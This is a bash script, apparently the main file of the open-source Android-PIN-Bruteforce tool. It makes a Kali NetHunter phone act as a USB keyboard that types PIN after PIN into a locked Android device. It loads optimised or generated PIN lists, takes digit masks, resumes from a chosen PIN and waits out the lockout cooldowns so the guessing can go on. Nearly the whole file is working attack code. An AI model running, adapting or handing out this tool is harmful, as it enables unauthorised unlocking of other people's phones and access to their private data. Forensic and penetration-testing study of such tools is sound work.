#!/bin/bash
# Android-PIN-Bruteforce
# 
# Unlock an Android phone (or device) by bruteforcing the lockscreen PIN.
# 
# Turn your Kali Nethunter phone into a bruteforce PIN cracker for Android devices!
# This uses the USB OTG cable to emulate a keyboard, automatically try PINs, and wait after trying too many wrong guesses.
#
# https://github.com/urbanadventurer/Android-PIN-Bruteforce

# Load Default Configuration
source config.default
# Load Configuration
source config

VERSION=0.2

DIRECTION=1 # go forwards
VERBOSE=0
DRY_RUN=0
#RET=0

LIGHT_GREEN="\033[92m"
LIGHT_YELLOW="\033[93m"
LIGHT_RED="\033[91m"
LIGHT_BLUE="\033[94m"
DEFAULT="\033[39m"
CLEAR_LINE="\033[1K"
MOVE_CURSOR_LEFT="\033[80D"

function usage() {
  echo -e "
Android-PIN-Bruteforce ($VERSION) is used to unlock an Android phone (or device) by bruteforcing the lockscreen PIN.
  Find more information at: https://github.com/urbanadventurer/Android-PIN-Bruteforce

Commands:
  crack\t\t\tBegin cracking PINs
  resume\t\tResume from a chosen PIN
  rewind\t\tCrack PINs in reverse from a chosen PIN
  diag\t\t\tDisplay diagnostic information
  version\t\tDisplay version information and exit

Options:
  -f, --from PIN\tResume from this PIN
  -a, --attempts NUM\tStarting from NUM incorrect attempts
  -m, --mask REGEX\tUse a mask for known digits in the PIN
  -t, --type TYPE\tSelect PIN or PATTERN cracking
  -l, --length NUM\tCrack PINs of NUM length
  -c, --config FILE\tSpecify configuration file to load
  -p, --pinlist FILE\tSpecify a custom PIN list
  -d, --dry-run\t\tDry run for testing. Doesn't send any keys.
  -v, --verbose\t\tOutput verbose logs

Usage:
  android-pin-bruteforce <command> [options]
"

}


function load_pinlist() {
  length=$1

  top_number=$((10**$length-1))

  # was a PIN_LIST selected by the user?
  if [ -f "$PIN_LIST" ]; then
    log_info "Loading user specified PIN list $PIN_LIST for $length digits"
    # TODO: this doesn't valdiate the PIN_LIST 
    pinlist=(`cat $PIN_LIST`)
  else
    # Check if an optimised list exists
    if [ -f "optimised-pin-length-$length.txt" ]; then
      PIN_LIST="optimised-pin-length-$length.txt"
      log_info "Loading optimised PIN list for $length digits ($PIN_LIST)"
      pinlist=(`cat $PIN_LIST`)
    else
      # generate the list
      log_info "Generating PIN list for $length digits"
      pinlist=(`seq -w 0 $top_number`)
    fi
  fi
  log_info "PIN list contains ${#pinlist[@]} PINs"
    

  if [ -n "$MASK" ]; then
    pinlist=(`echo "${pinlist[@]}" | tr ' ' '\n' | egrep "$MASK" | tr '\n' ' '`)
  fi

  # validate mask returned PINs
  if [ ${#pinlist[@]} -eq 0 ]; then
    log_fail "MASK $MASK created an invalid PIN list with zero PINs"
    abort
  fi

  resume_from_index=0
  if [ -n "$RESUME_FROM_PIN" ]; then
 #   log_debug "Looking for $RESUME_FROM_PIN in pinlist"
    for i in "${!pinlist[@]}"; do
       if [[ "${pinlist[$i]}" = "${RESUME_FROM_PIN}" ]]; then
  #         log_debug  "Found ${RESUME_FROM_PIN} at element ${i}"
          resume_from_index=$i
       fi
    done
  fi
}

function repeat(){
  printf "%0.s$1" $(eval echo {1..$2})
}

# progress bar
# https://unix.stackexchange.com/questions/415421/linux-how-to-create-simple-progress-bar-in-bash
function prog() {
    tput cup 0 0
    local w=80 p=$1
    shift
    # create a string of spaces, then change them to dots
    printf -v dots "%*s" "$(( $p*$w/100 ))" ""
    dots=${dots// /x}
    # print those dots on a fixed-width space plus the percentage etc. 
    printf "\r\e[K|%-*s| %3d %% %s" "$w" "$dots" "$p" "$*"
}


function diagnostic_info() {
  log_info "# Diagnostic info"

  if [ -e $KEYBOARD_DEVICE ]; then
    log_pass "HID device ($KEYBOARD_DEVICE) found"
    ls -l $KEYBOARD_DEVICE
  else
    log_fail "HID device ($KEYBOARD_DEVICE) not found"
  fi

  if [ -f $HID_KEYBOARD ]; then
    log_pass "hid-keyboard executable ($HID_KEYBOARD) found" 
    ls -l $HID_KEYBOARD
  else
    log_fail "hid-keyboard executable ($HID_KEYBOARD) not found"  
  fi

  if [ -f $USB_DEVICES ]; then
    log_pass "usb-devices executable ($USB_DEVICES) found" 
    ls -l $USB_DEVICES
  else
    log_fail "usb-devices executable ($USB_DEVICES) not found"  
  fi

  log_info "## Executing Command: $USB_DEVICES"
  $USB_DEVICES
  RET=$?
  if [ $RET -eq 0 ]; then
    log_pass "usb-devices script executed succeessfully."
  else
    log_fail "usb-devices script failed. Return code $RET."
  fi

  log_info "## Finding Android Phone USB Device"
  devices=$($USB_DEVICES | egrep -C 5 "Manufacturer=[^L][^i][^n][^u][^x]" \
 | egrep "Vendor|Manufacturer|Product|SerialNumber" | cut -c 5- )
  
  if [ -n "$devices" ]; then
    log_fail "Unexpected result, device identified: $devices. Check your USB cables. The OTG cable should be attached to the locked phone."
  else
    log_info "Expected result, no device found."
  fi

  log_info "## Sending Enter Key"
  echo enter | $HID_KEYBOARD $KEYBOARD_DEVICE keyboard
  RET=$?

  if [ $RET -eq 0 ]; then
    log_pass "Key was sent succeessfully."
  else
    log_fail "Key failed to send. Return code $RET."
  fi

  log_info "## Executing Command: /system/bin/getprop |grep usb"
  /system/bin/getprop |grep usb
  RET=$?
  echo  

  log_info "## Executing Command: dmesg | grep -i usb | tail"
  dmesg | grep -i usb | tail
  echo

  log_info "# Troubleshooting tips"
  echo "- Check the NetHunter phone is succesfully emulating a keyboard by connecting it to a computer with a regular charging/data USB cable. Open a text editor like Notepad and you should see it sending PINs. Note that you do not need an OTG cable for this."
  echo "- Check the Nethunter phone has a regular USB cable attached, and the locked phone has an OTG adaptor attached."
  echo "- Try using different cables/adaptors. You may have a faulty cable/adaptor."
  echo "- Perform a hard reset of both phones by holding down the power button for 20 seconds."
  echo "- Try this command: /system/bin/setprop sys.usb.config hid"

  echo
  exit
}

# Show configuration
function show_configuration() {
  log_info "# Current Configuration"
  log_conf "Configuration file: $CONFIG_FILE"
  log_conf "## PINs"
  log_conf "PIN list: $PIN_LIST"
  log_conf "Mask: $MASK"
  log_conf "Resume from: $RESUME_FROM_PIN"
  log_conf "PIN Type (PIN or Pattern): $PIN_TYPE"
  log_conf "PIN Length: $PIN_LENGTH"
  log_conf "Direction (normal or rewind): $DIRECTION"
  log_conf
  log_conf "## Timing:"
  log_conf "Delay before starting: $DELAY_BEFORE_STARTING"
  log_conf "Delay between keys: $DELAY_BETWEEN_KEYS"
  log_conf "Send keys to stay awake during cooldown every N seconds: $SEND_KEYS_STAY_AWAKE_DURING_COOLDOWN_EVERY_N_SECONDS"
  log_conf "Send keys to dismiss popups N seconds before cooldown ends: $SEND_KEYS_DISMISS_POPUPS_N_SECONDS_BEFORE_COOLDOWN_END"
  row_count="${PROGRESSIVE_ARRAY_ATTEMPT_COUNT__________[@]}"
  row_attempts="${PROGRESSIVE_ARRAY_ATTEMPTS_UNTIL_COOLDOWN[@]}"
  row_cooldown="${PROGRESSIVE_ARRAY_COOLDOWN_IN_SECONDS____[@]}"
  log_conf " - Attempt count          : $row_count"
  log_conf " - Attempts until cooldown: $row_attempts"
  log_conf " - Cooldown in seconds    : $row_cooldown"
  log_conf
  log_conf "## Keys:"
  log_conf "Keys to send before starting: $KEYS_BEFORE_STARTING"  
  log_conf "Keys to bring up the lock screen: $KEYS_BEFORE_EACH_PIN"
  log_conf "Keys to stay awake during cooldown: $KEYS_STAY_AWAKE_DURING_COOLDOWN"
  log_conf "Keys to send at end of cooldown: $SEND_KEYS_DISMISS_POPUPS_AT_COOLDOWN_END"
  log_conf
  log_conf "## Exiting"
  log_conf "Exit after fail count: $EXIT_AFTER_FAIL_COUNT"
  log_conf
  log_conf "## File paths"
  log_conf "Log file: $LOG"
  log_conf "HID Keyboard device: $KEYBOARD_DEVICE"
  log_conf "Path to hid-keyboard: $HID_KEYBOARD"
  log_conf "Path to usb-devices: $USB_DEVICES"
  log_conf
  log_conf "## Configuration"
  log_conf "Dry Run: $DRY_RUN"
  log_conf "Verbose: $VERBOSE"
}

function abort() {
  if [ $DRY_RUN -eq 0 ]; then
    exit 1
  else
    # continue
    echo Dry Run Continues
  fi
}

function send_enter() {
  send_key enter
}

function send_esc() {
  send_key esc
}

function send_keys() {
  prompt="$1"
  delay="$2"

  for key in $prompt; do

    case $key in 
      "ctrl_escape")
        send_key "left-ctrl escape"
        ;;
      "ctrl-escape")
        send_key "left-ctrl escape"
        ;;
      "space_enter")
        send_key "spacebar return"
        ;;
      "space-enter")
        send_key "spacebar return"
        ;;
      "mouse-move")
        test_send_mouse_btn
        ;;
      "mouse_move")
        test_send_mouse_btn
        ;;
      "mouse-left-button")
        test_send_mouse_move
        ;;
      "mouse_left_button")
        test_send_mouse_move
        ;;
      *)
        send_key $key $delay
      ;;
    esac
#    if [ $key == "ctrl_escape" ] || [ $key == "ctrl-escape" ] ; then
#      send_key "left-ctrl escape"
#    else
#      send_key $key
#    fi
  done
}

function test_send_mouse_btn(){
  log_debug "Sending mouse: $1"
  if [ $DRY_RUN -eq 0 ]; then
    echo "0 0" | $HID_KEYBOARD $KEYBOARD_DEVICE mouse --b1 2>/dev/null
    RET=$?
  else
    RET=0 # as if it succeeded
  fi
  sleep $DELAY_BETWEEN_KEYS

}

function test_send_mouse_move(){
  log_debug "Sending mouse: $1"
  if [ $DRY_RUN -eq 0 ]; then
    echo "0 0" | $HID_KEYBOARD $KEYBOARD_DEVICE mouse 2>/dev/null
    RET=$?
  else
    RET=0 # as if it succeeded
  fi
  sleep $DELAY_BETWEEN_KEYS
  
}

function send_key(){
  if [ "$2" = "nodelay" ]; then
    delay=0
  else
    delay=$DELAY_BETWEEN_KEYS
  fi
  log_debug "Sending key: $1 with delay: $delay"

  if [ $DRY_RUN -eq 0 ]; then
    echo "$1" | $HID_KEYBOARD $KEYBOARD_DEVICE keyboard 2>/dev/null
    RET=$?
  else
    RET=0 # as if it succeeded
  fi
  sleep $delay
}


function log_info(){
  echo -e "[${LIGHT_BLUE}INFO${DEFAULT}] $1" | tee -a $LOG
}

function log_pass(){
  echo -e "[${LIGHT_GREEN}PASS${DEFAULT}] $1" | tee -a $LOG
}

function log_fail(){
  echo -e "[${LIGHT_RED}FAIL${DEFAULT}] $1" | tee -a $LOG
}

function log_warn(){
  echo -e "[${LIGHT_YELLOW}WARN${DEFAULT}] $1" | tee -a $LOG
}

function log_conf(){
  echo -e "[${LIGHT_YELLOW}CONF${DEFAULT}] $1" | tee -a $LOG
}

function log_debug(){
  if [ $VERBOSE -gt 0 ]; then
    echo -e "[${LIGHT_YELLOW}DEBUG${DEFAULT}] $1" | tee -a $LOG
  fi
}


function monitor_phone_connection(){
  # check connection to phone
  # RET is set by the send_key/send_enter function
  fail_counter=0
  while [ $RET != 0 ]; do
    log_fail "HID USB device not ready. $HID_KEYBOARD returned $RET." 
    sleep 2
    send_keys "$KEYS_BEFORE_EACH_PIN"
    ((fail_counter++))

    if [[ $fail_counter -gt $EXIT_AFTER_FAIL_COUNT ]]; then
      log_fail "Exiting after $EXIT_AFTER_FAIL_COUNT successive failures."
      abort
    fi
  done
}


function check_environment(){
  if [ -e $KEYBOARD_DEVICE ]; then
    log_pass "HID device ($KEYBOARD_DEVICE) found"
  else
    log_fail "HID device ($KEYBOARD_DEVICE) not found"
    abort
  fi

  if [ -f $HID_KEYBOARD ]; then
    log_pass "hid-keyboard executable ($HID_KEYBOARD) found" 
  else
    log_fail "hid-keyboard executable ($HID_KEYBOARD) not found. Hint: You can configure an alternative location for this file with the HID_KEYBOARD variable in the config file."
    abort
  fi
}


if [ -z "$1" ]; then
  usage
  exit 1
fi
echo "Android PIN brute-force :: version $VERSION" | tee -a $LOG

# Commandline option handling inspired by ./configure

ac_prev=
for ac_option
do
  # If the previous option needs an argument, assign it.
  if test -n "$ac_prev"; then
    eval "$ac_prev=\$ac_option"
    ac_prev=
    continue
  fi

  case "$ac_option" in
  -*=*) ac_optarg=`echo "$ac_option" | sed 's/[-_a-zA-Z0-9]*=//'` ;;
  *) ac_optarg= ;;
  esac

  case "$ac_option" in

  -attempts | -a | --attempts)
    ac_prev=attempts ;;

  -attempts=* | -a=* | --attempts=*)
    attempts="$ac_optarg" ;;

  -config | -c | --config)
    ac_prev=config ;;

  -config=* | -c=* | --config=*)
    config="$ac_optarg" ;;

  -from | -f | --from)
    ac_prev=from ;;

  -from=* | -f=* | --from=*)
    from="$ac_optarg" ;;

  -length | -l | --length)
    ac_prev=length ;;

  -length=* | -l=* | --length=*)
    length="$ac_optarg" ;;

  -mask | -m | --mask)
    ac_prev=mask ;;

  -mask=* | -m=* | --mask=*)
    mask="$ac_optarg" ;;

  -type | -t | --type)
    ac_prev=type ;;

  -type=* | -t=* | --type=*)
    type="$ac_optarg" ;;

  -pinlist | -p | --pinlist)
    ac_prev=pinlist ;;

  -pinlist=* | -p=* | --pinlist=*)
    pinlist="$ac_optarg" ;;

  -verbose | -v | --verbose)
    VERBOSE=1 ;;

  -help | -h | --help)
    usage 
    exit 1 ;;

  -dryrun | -d | --dryrun | -dry-run | --dry-run )
    DRY_RUN=1 ;;

  diag*)
    diagnostic_info
    exit ;;

  crack)
    ACTION=crack ;;

  resume)
    ACTION=resume ;;

  rewind)
    ACTION=rewind 
    DIRECTION=-1 ;;

  version)
    echo "Android-PIN-Bruteforce $VERSION"
    exit ;;

  -*) { echo "Error: $ac_option: invalid option; use --help to show usage" 1>&2; exit 1; }
    ;;

  *)
    if test "x$nonopt" != xNONE; then
      { echo "Error: invalid options" 1>&2; exit 1; }
    fi
    nonopt="$ac_option"
    ;;

  esac
done

if test -n "$ac_prev"; then
  { echo "configure: error: missing argument to --`echo $ac_prev | sed 's/_/-/g'`" 1>&2; exit 1; }
fi


if [[ -n "$config" ]]; then
  # load the config file first
  if [[ -f "$config" ]]; then
    log_info "Loaded configuration file: $config"
    source "$config"
    CONFIG_FILE="$config"
  else
    log_fail "Unable to load configuration file: $config"
    abort
  fi
fi

# only set VARS if specified in commandline arguments
# commandline arguments overide the config file
if [[ -n "$mask" ]]; then
  MASK=$mask
fi
if [[ -n "$from" ]]; then
  RESUME_FROM_PIN=$from
fi
if [[ -n "$type" ]]; then
  PIN_TYPE=$type
fi
if [[ -n "$length" ]]; then
  PIN_LENGTH=$length
fi
if [[ -n "$pinlist" ]]; then
  PIN_LIST=$pinlist
fi
if [[ -n "$attempts" ]]; then
  STARTING_ATTEMPTS=$attempts
fi

# Validation

# Validate PIN TYPE 
case "$PIN_TYPE" in
  pattern | PATTERN )
    log_fail "Pattern cracking is not yet implemented."
    abort ;;
  pin | PIN )
    ;;
  *)
    log_fail "Type $PIN_TYPE cracking is not available."
    abort ;;
esac

# Validate PIN LENGTH
if [[ "$PIN_LENGTH" -gt 0 ]] && [[ "$PIN_LENGTH" -le 8 ]]; then
  # nothing
  echo -n
else
  log_fail "PIN length $PIN_LENGTH is invalid. Valid lengths are 1 to 8."
fi

# Validate PIN LIST
# either set by config or commandline options
if [[ -n "$PIN_LIST" ]]; then
  if [[ -f "$PIN_LIST" ]]; then
    echo -n
  else
    log_fail "$PIN_LIST is not a valid PIN LIST"
    exit 1
  fi
fi

# rewind, resume require that RESUME_FROM_PIN be set
if [[ "$ACTION" = "resume" ]] || [[ "$ACTION" = "rewind" ]] && [[ -z "$RESUME_FROM_PIN" ]]; then
  log_fail "$ACTION requires that --from be set"
  exit 1
fi

if [[ $DRY_RUN -eq 1 ]]; then
  log_info "Dry run enabled"
fi

load_pinlist $PIN_LENGTH

if [[ $VERBOSE > 0 ]]; then
  show_configuration
fi

# Check Environment
log_info "Checking environment"
check_environment

send_keys "$KEYS_BEFORE_STARTING"
sleep $DELAY_BEFORE_STARTING

position=$resume_from_index
pinlist_n_elements=${#pinlist[@]}
cooldown_counter=0
progressive_array_finished=0

# Handle starting attempts
if [[ $STARTING_ATTEMPTS > 0 ]]; then
  count=$((STARTING_ATTEMPTS - 1))
else
  count=0
fi

top_progressive_array_position=$(( ${#PROGRESSIVE_ARRAY_ATTEMPT_COUNT__________[@]} - 1 ))

# find the position in PROGRESSIVE_ARRAY_ATTEMPT_COUNT__________
progressive_array_position=0
for (( n=0; n <= $top_progressive_array_position; n++ ))
do
  if [[ ${PROGRESSIVE_ARRAY_ATTEMPT_COUNT__________[$n]} -gt $count ]]; then
    break
  fi
  progressive_array_position=$n
done
# is it the last position?
if [ $progressive_array_position -eq $top_progressive_array_position ]; then 
  progressive_array_finished=1
fi

cooldown_time=${PROGRESSIVE_ARRAY_COOLDOWN_IN_SECONDS____[$progressive_array_position]}
cooldown_after_n_attempts=${PROGRESSIVE_ARRAY_ATTEMPTS_UNTIL_COOLDOWN[$progressive_array_position]}

for (( position=$resume_from_index ; position>=0 && position <= pinlist_n_elements; position=position+DIRECTION ))
do
  # rename to attempt_counter
  ((count++))
  ((attempts_before_cooldown_counter++))

  pin=${pinlist[position]}

  # send prompt keys,e.g. escape and enter before every PIN attempted
  send_keys "$KEYS_BEFORE_EACH_PIN"
 
  # if we got an error from sending the key, check the phone connection
  if [ $RET -gt 0 ]; then
    monitor_phone_connection
  fi

  sleep $DELAY_AFTER_KEYS_BEFORE_EACH_PIN

  percent_complete=$((100*$position/$pinlist_n_elements))
  echo "[SEND] $pin. Attempt $count ($percent_complete%) at $(date +"%b%d %r")" | tee -a "$LOG" 
#  prog $percent_complete

  for i in `echo "$pin" | grep -o .`; do
    send_key $i
  done
  send_keys "$KEYS_AFTER_EACH_PIN"

  if [[ $progressive_array_finished -ne 1 && $top_progressive_array_position -gt 0 ]]; then
    # log_info "Count: $count  Attempts_before_cooldown_counter: $attempts_before_cooldown_counter    Cooldown_time: $cooldown_time   Cooldown after N attempts: $cooldown_after_n_attempts"
    # check if we are changing the cooldown variables
    
    if [ $count -eq ${PROGRESSIVE_ARRAY_ATTEMPT_COUNT__________[$progressive_array_position + 1]} ]; then
      ((progressive_array_position++))

      cooldown_time=${PROGRESSIVE_ARRAY_COOLDOWN_IN_SECONDS____[$progressive_array_position]}
      cooldown_after_n_attempts=${PROGRESSIVE_ARRAY_ATTEMPTS_UNTIL_COOLDOWN[$progressive_array_position]}
      
      if [ $progressive_array_position -lt $top_progressive_array_position ]; then 
        attempts_before_cooldown_counter=0
      else
        progressive_array_finished=1
        log_info "Reached last position in Progressive Cooldown Array"
      fi

      # first time only
      if [ $count -eq 1 ]; then
        attempts_before_cooldown_counter=1
      fi
      log_info "Progressive Array [$progressive_array_position]. Reached $count attempts. Cooldown time is $cooldown_time seconds after every $cooldown_after_n_attempts PIN attempt(s)."
    fi
  fi

  # cooldown_time is optional
  if [[ $cooldown_time > 0 && $cooldown_after_n_attempts > 0 ]]; then
    #log_info "Cooldown for :$cooldown_time"
    # if we are after N attempts
    if [ $((attempts_before_cooldown_counter % $cooldown_after_n_attempts)) = 0 ]; then
      # countdown cooldown_time seconds
      log_debug "Countdown for $cooldown_time"
      for (( countdown=$cooldown_time; countdown > 0; countdown-- ))
      do
        echo -ne "$CLEAR_LINE$MOVE_CURSOR_LEFT" # clear line and move cursor left
        echo -ne "[${LIGHT_YELLOW}WAIT${DEFAULT}] "
        echo -ne "$countdown"

        # Optionally send keys during COOLDOWN EVERY N SECONDS
        # note: nodelay works best for sending a single key during cooldown, but is this really a useful feature?
        if [[ $SEND_KEYS_STAY_AWAKE_DURING_COOLDOWN_EVERY_N_SECONDS > 0 && $(($countdown % ${SEND_KEYS_STAY_AWAKE_DURING_COOLDOWN_EVERY_N_SECONDS})) = 0 ]]; then
          send_keys "$KEYS_STAY_AWAKE_DURING_COOLDOWN" nodelay
        fi

        # Optionally send keys just before COOLDOWN ends to wake up and dismiss popups, instead of during cooldown
        if [[ $SEND_KEYS_DISMISS_POPUPS_N_SECONDS_BEFORE_COOLDOWN_END > 0 && $countdown -eq $SEND_KEYS_DISMISS_POPUPS_N_SECONDS_BEFORE_COOLDOWN_END ]]; then
          log_debug "Sending keys to dismiss popups: $SEND_KEYS_DISMISS_POPUPS_AT_COOLDOWN_END"
          send_keys "$SEND_KEYS_DISMISS_POPUPS_AT_COOLDOWN_END"
        fi
        sleep 1
      done
      # extra sleep so we don't get out of sync with the phone
      sleep 1
      echo -ne "$CLEAR_LINE$MOVE_CURSOR_LEFT" 
    fi
  fi
done

log_info "End of PIN list reached"

